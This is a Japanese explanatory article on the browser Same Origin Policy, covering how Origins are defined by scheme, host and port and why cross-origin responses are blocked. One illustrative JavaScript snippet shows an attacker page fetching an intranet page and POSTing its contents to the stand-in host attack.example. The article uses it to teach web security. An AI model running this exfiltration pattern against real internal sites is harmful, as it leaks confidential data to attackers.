---
title: "Same Origin Policy というセキュリティモデル"
emoji: "📝"
type: "tech"
topics: ["same origin policy", "origin", "web"]
published: false
---

# Same Origin Policy

SOP とは、ユーザーを保護するために Web に設けられた **セキュリティモデル** である。まずは、 SOP が実際にユーザーをどのように保護するのかを見ていく。


## SOP が無かったら

まず SOP を意識する身近な場面として、ブラウザから`fetch()` API を用いて HTTP リクエストを送信するケースを例に考える。

以下のような Web サイトを想定しよう。

- 社内サイト(Intra)
  - <https://intra.example> は、社内ネットワークに接続した社員のみアクセスできる
  - そこには社外秘の情報があり、社外からこの情報を狙う攻撃者がいる
  - 社員は、社外ネットワーク(インターネット)にもアクセスできる
- 攻撃者サイト(Attack)
  - <https://attack.example> はインターネット上にあり、誰でもアクセスできる
  - カモフラージュのため EC サイトなどを装っているが、悪意のある攻撃者が運営している
  - 攻撃者は社内ネットワークにはアクセスできないが、社員を Attack にアクセスさせ、 Intra の情報を収集できないかと狙っている

![Intra と Attack の構成](https://cacoo.com/diagrams/L0Jn5wPiobCrsSDy-98D42.png 'overview')

:::message
.example は RFC で定義された **例示のため** に自由に使うことができる Top Level Domain だ。予約されており実際に取得されることが無いため、こうしたドキュメントなどで自由に使うことができる。

- [RFC 6761 - Special-Use Domain Names](https://tools.ietf.org/html/rfc6761)

逆に、こうしたドキュメントにそれっぽい(例えばここでは intra dot com)ドメインが無責任に書かれている場合があるが、 .com などは実際に取得することが可能であるため、仮に執筆時点でだれにも取得されていなくても、将来的に取得される可能性もある。例えば、ユーザの多い負荷テストツールのドキュメントのサンプルに、自分が持っているドメインが書かれていて、毎日のように大量のリクエストが来たらどうだろうか?

慣れないと多少わかりにくいかもしれないが、ドキュメントやサンプルを書く場合には .example を使うべきであり、本書でもそれで統一している。頭の中では .com などに読み替えるとわかりやすいだろう。
:::


## 攻撃者サイトからの攻撃例

攻撃者が Attack に次のような JS を仕込み、そのページを何らかの方法で社員にアクセスさせることで、 Intra の情報を抜こうとしているとする。


```js
// AttackからIntraの情報を取得する
const res  = await fetch("https://intra.example")
const text = await res.text()

// その情報をAttackに転送する
await fetch("https://attack.example", {
  method: "post",
  body:   text
})
```

社員がこのページにアクセスすると、 JS で生成されたリクエストは、同じ社内ネットワークにある Intra に届いてしまい、取得した結果を Attack に POST で転送すれば、攻撃者はその内容を得ることができてしまう。攻撃者は、社員が Attack を閲覧している間に Intra を JS でクロールして、機密情報をごっそり抜くことも可能になる。

これが成立してしまうのであれば、会社は社員のインターネットへのアクセスを全面的に禁止するしかないが、それ以前にそんな危険な機能を Web 標準やブラウザ実装に入れることはできない。


## Web 以外の攻撃経路との違い

この攻撃の発想は Web だけのものではなく、もし社内のマシンに同じことを行うプログラムを実行させることができれば、攻撃は成立する。しかし、その場合は何らかの方法でネイティブアプリを**ダウンロード/インストール/実行**させる、いわゆるマルウェアに感染させるような下準備が必要となる。

一方、 Web の場合は、ページを閲覧するだけで JS が取得され、ネイティブアプリでは行われる配布元の検証といったプロセスを経ずに実行されるため、 URL にアクセスさせるだけで成立してしまう。この攻撃を防ぐには、取得した JS を何の検証もせずに実行しても、情報の流出などが発生しないようにする仕組みが必要だ。

そこで、このような攻撃が成立しないようにブラウザに設けられた仕組み、セキュリティモデルの一つが SOP なのだ。


## SOP の定義

SOP を知るには、まず Origin の定義を知る必要がある。 Origin とは基本的に(応用は後述)、 URL に含まれる Scheme, Host, Port を組み合わせたものであると理解すればよい。

Intra と Attack の Origin は表のようになり、 2 つは Scheme(https) と Port(443) は同じだが、 Host(intra.example, attack.example) が違うため、異なる Origin とみなされる。[^1]

| URL                      | Scheme | Host           | Port |
|--------------------------|--------|----------------|------|
| https://intra.example    | https  | intra.example  | 443  |
| https://attack.example   | https  | attack.example | 443  |


[^1]:Port が省略されている場合, Scheme が http のときは 80 , https のときは 443 になる

SOP の実体は、**ある Origin のコンテンツからは、同じ(Same) Origin のコンテンツにしかアクセスできない** という制限を指す。

先ほど Attack に設置された攻撃用の次の JS は、 Intra に対して GET を送信する`fetch()`が SOP 違反でエラーになるため、情報を収集することはできない。


```js
// Intraの情報を取得する(Originが違うため失敗する)
const res = await fetch("https://intra.example")
// 情報を盗むことはできない
```

SOP のおかげで、 Attack に限らずインターネット上のどんなサイトにアクセスしても、 Origin が違えば Intra の情報を勝手に抜かれることはなくなり、ユーザーは安心して Web を使うことができるのだ。


### Origin != Host

Origin は Host だけではないという点も重要だ。「Host が同じなら、そのサービスの管理者は同じなのだから、 Scheme や Port の差まで見る必要がないのでは?」と思うかもしれない。そこで、もし Origin の定義に Scheme や Port が含まれていなかった場合、何が起こるかを考えてみよう。

もし Origin の定義に Scheme, Port が含まれなかった場合、次の 3 つは同じ Origin となる。

1. https://intra.example
2. https://intra.example:3000
3. http://intra.example

例えば❷は Port が開発用のものだとする。開発環境はセキュリティ対策も弱く、本番よりも攻撃が容易な場合が多いだろう。この開発環境から本番環境❶にリクエストが成功するのであれば、攻撃者は開発環境を狙うことになり、安心して開発ができなくなってしまう。

また、❸は http のため経路が暗号化されておらず、中間者によって改ざんされる危険がある。改ざんされた❸に埋め込まれた JS から❶へのリクエストが成功してしまっては、❶が暗号化されている意味がなくなってしまう。

他にも、同じドメイン上には Web に限らず様々なサービスが別の Port でデプロイされている可能性があるため、それらが全て同じ Origin となると、攻撃される隙が多くなってしまうのだ。


### SOP の注意点

異なる Origin へのリクエストは **失敗する** が **リクエストが行われない** わけではない。


```js
// Attackからのリクエスト(Originが違うため失敗する)
const res = await fetch("https://intra.example")
```

Wireshark 等で実際にブラウザから送られているパケットを見ると、次のような HTTP リクエストがサーバに対して送られていることがわかる。


```http
GET / HTTP/1.1
Host: intra.example
Origin: https://attack.example
```

:::message
解説に不要なヘッダは削除している
:::

このリクエスト自体は正しいものとして受け入れられ、サーバからはレスポンスが返されるだろう。


```http
HTTP/1.1 200 OK
Content-Length: 1024
Content-Type: text/html

<!DOCTYPE html>
...
```

SOP に違反して JS でエラーが上がるのは、リクエストを送らなかったからでも、レスポンスが届かなかったからでもない。ブラウザが受信したレスポンスの内容から **SOP に違反していると判断** し、 JS にはレスポンスを渡さずエラーを上げているからなのだ。

URL を確認すれば異なる Origin へのリクエストかどうかわかるので、リクエストを送信する前にブラウザが阻止すれば良いように思うかもしれない。もちろん、それは可能だ。しかし、そうしてしまうと**サーバが異なる Origin からのリクエストを許可する**ことができなくなるため、ブラウザはレスポンスの内容を確認してから決めている。

**リクエストは送信されているが JS ではエラーになる**、ここが SOP および CORS を理解するうえで最重要な点なので、次説で順を追って解説していく。

:::details [コラム] User Script を許容するサービス
ブログなどのサービスで、ユーザが任意の JS をユーザスクリプトとして貼ることができるサービスがある。そうしたサービスを提供する場合も、 Origin には注意が必要だ。

例えば、そのサービスが `https://example.com/alice` や `https://example.com/bob` のように、ユーザごとにパスが割り当てられるサービスの場合、 `/alice` が貼った JS のオリジンは `/bob` と同じになってしまう。これは、例えば  `/alice` のページに `/bob` がアクセスすると、 `/bob/settings` のようなページに `/alice` のユーザスクリプトがアクセスできてしまい、脆弱性になる可能性があることを意味する。

したがって、ユーザスクリプトを許可する場合は、大きく以下の 2 つの手段が考えられるだろう。

- https://alice.example.com と https://bob.example.com のように、ユーザに対してパスではなくサブドメインを割り当てて Origin を変える
- `/alice` に貼ったユーザスクリプトは、ログインしている `/alice` にしか取得できないようにする

前者は比較的安全に実装ができるが、後者の場合は、サイトのどこかに穴があり、攻撃者のユーザスクリプトを他のユーザに適用することができると脆弱性になるため、実装には注意が必要だ。
:::

:::message alert
1~3 節は [Web+DB Press vol.115](https://gihyo.jp/magazine/wdpress/archive/2020/vol115) (2020 年 2 月号) に掲載されたものをベースに、大幅に加筆修正したものです。
:::
